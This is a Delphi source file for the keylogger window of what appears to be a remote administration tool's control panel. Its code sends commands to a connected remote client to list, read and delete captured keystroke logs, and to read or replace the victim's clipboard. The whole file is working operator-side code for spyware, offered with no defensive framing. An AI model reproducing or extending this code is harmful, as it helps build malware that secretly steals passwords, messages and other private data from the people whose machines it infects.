unit UnitKeylogger;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ExtCtrls, ComCtrls, StdCtrls, Menus, ImgList, UnitConnection, UnitUtils,
  UnitCommands;

type
  TFormKeylogger = class(TForm)
    pgc1: TPageControl;
    stat1: TStatusBar;
    ts1: TTabSheet;
    ts2: TTabSheet;
    mmoClipboard: TMemo;
    lvLogs: TListView;
    spl1: TSplitter;
    mmoLogs: TMemo;
    pm1: TPopupMenu;
    R1: TMenuItem;
    N1: TMenuItem;
    R2: TMenuItem;
    D1: TMenuItem;
    pm2: TPopupMenu;
    R3: TMenuItem;
    S1: TMenuItem;
    il1: TImageList;
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure FormCreate(Sender: TObject);
    procedure FormShow(Sender: TObject);
    procedure R1Click(Sender: TObject);
    procedure R2Click(Sender: TObject);
    procedure D1Click(Sender: TObject);
    procedure R3Click(Sender: TObject);
    procedure S1Click(Sender: TObject);
  protected
    procedure CreateParams(var Params: TCreateParams) ; override;
  private
    { Private declarations }
    ClientDatas: TClientDatas;
  public
    { Public declarations }
    constructor Create(aOwner: TComponent; _ClientDatas: TClientDatas);
    procedure OnClientRead(Datas: string);
  end;

var
  FormKeylogger: TFormKeylogger;

implementation

{$R *.dfm}

constructor TFormKeylogger.Create(aOwner: TComponent; _ClientDatas: TClientDatas);
begin
  inherited Create(aOwner);
  ClientDatas := _ClientDatas;
end;

procedure TFormKeylogger.CreateParams(var Params: TCreateParams) ;
begin
  inherited;
  Params.ExStyle := Params.ExStyle or WS_EX_APPWINDOW;
  Params.WndParent := 0;
end;

procedure TFormKeylogger.OnClientRead(Datas: string);
var
  Cmd, i: Integer;
  TmpItem: TListItem;
  TmpList: TStringArray;
  TmpStr: string;
begin
  Cmd := StrToInt(Copy(Datas, 1, Pos('|', Datas) - 1)); 
  Delete(Datas, 1, Pos('|', Datas));

  case Cmd of
    CMD_CLIPBOARD_READ:
    begin
      if Datas <> '' then
      begin
        mmoClipboard.Text := Datas;
        stat1.Panels.Items[0].Text := 'Clipboard datas showed successfully!';
      end
      else stat1.Panels.Items[0].Text := 'Clipboard datas not found.';
    end;

    CMD_CLIPBOARD_SET:
    begin
      ClientDatas.SendDatas(IntToStr(CMD_CLIPBOARD_READ) + '|');
    end;

    CMD_KEYLOGGER_LOGS:
    begin
      lvLogs.Items.Clear;
      lvLogs.Items.BeginUpdate;

      while Datas <> '' do
      begin
        TmpStr := Copy(Datas, 1, Pos('|', Datas) - 1);
        Delete(Datas, 1, Pos('|', Datas));

        TmpItem := lvLogs.Items.Add;
        TmpItem.Caption := TmpStr;
        TmpItem.ImageIndex := 0;
      end;

      lvLogs.Items.EndUpdate;

      if lvLogs.Items.Count > 0 then
        stat1.Panels.Items[0].Text := 'Logs listed successfully!'
      else stat1.Panels.Items[0].Text := 'Logs not found.';
    end;

    CMD_KEYLOGGER_DELETE:
    begin
      TmpList := ParseString('|', Datas);

      if TmpList[1] = 'N' then stat1.Panels.Items[0].Text := 'Failed to delete log.' else
      begin
        lvLogs.Items.BeginUpdate;
        for i := lvLogs.Items.Count - 1 downto 0 do
        begin
          if lvLogs.Items.Item[i].Caption <> TmpList[0] then Continue;
          lvLogs.Items.Item[i].Delete;
        end;
                      
        lvLogs.Items.EndUpdate;
        stat1.Panels.Items[0].Text := 'Log deleted successfully!';
      end;
    end;
    
    CMD_KEYLOGGER_READ:
    begin
      if Datas <> '' then
      begin
        mmoLogs.Text := Datas;
        stat1.Panels.Items[0].Text := 'Log datas showed successfully!';
      end
      else stat1.Panels.Items[0].Text := 'Log datas not found.';
    end;
  end;
end;

procedure TFormKeylogger.FormClose(Sender: TObject;
  var Action: TCloseAction);
begin
  //
end;

procedure TFormKeylogger.FormCreate(Sender: TObject);
begin
  //
end;

procedure TFormKeylogger.FormShow(Sender: TObject);
begin
  pgc1.ActivePageIndex := 0;
  R1.Click; //request logs list
  
  //center window
  Left := (Screen.Width - Width) div 2;
  Top := (Screen.Height - Height) div 2;
end;

procedure TFormKeylogger.R1Click(Sender: TObject);
begin
  ClientDatas.SendDatas(IntToStr(CMD_KEYLOGGER_LOGS) + '|');
  stat1.Panels.Items[0].Text := 'Sending request, please wait...';
end;

procedure TFormKeylogger.R2Click(Sender: TObject);
begin
  if not Assigned(lvLogs.Selected) then Exit;
  ClientDatas.SendDatas(IntToStr(CMD_KEYLOGGER_READ) + '|' + lvLogs.Selected.Caption);
  stat1.Panels.Items[0].Text := 'Sending request, please wait...';
end;

procedure TFormKeylogger.D1Click(Sender: TObject);
begin
  if not Assigned(lvLogs.Selected) then Exit;
  ClientDatas.SendDatas(IntToStr(CMD_KEYLOGGER_DELETE) + '|' + lvLogs.Selected.Caption);
  stat1.Panels.Items[0].Text := 'Sending request, please wait...';
end;

procedure TFormKeylogger.R3Click(Sender: TObject);
begin
  ClientDatas.SendDatas(IntToStr(CMD_CLIPBOARD_READ) + '|');
  stat1.Panels.Items[0].Text := 'Sending request, please wait...';
end;

procedure TFormKeylogger.S1Click(Sender: TObject);
var
  TmpStr: string;
begin
  if not InputQuery('Set datas', 'Value', TmpStr) then Exit;
  ClientDatas.SendDatas(IntToStr(CMD_CLIPBOARD_SET) + '|' + TmpStr);
  stat1.Panels.Items[0].Text := 'Sending request, please wait...';
end;

end.
